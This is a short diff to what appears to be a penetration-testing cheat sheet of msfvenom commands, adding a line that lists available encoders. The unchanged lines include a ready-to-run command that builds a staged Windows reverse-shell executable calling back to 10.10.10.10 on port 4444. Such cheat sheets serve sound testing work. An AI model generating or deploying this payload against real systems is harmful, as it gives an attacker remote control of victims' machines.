@@ -1,6 +1,7 @@
 # List 
 msfvenom -l payloads
 msfvenom -l formats
+msfvenom -l encoders
 
 # Create an staged Windows binary payload
 msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
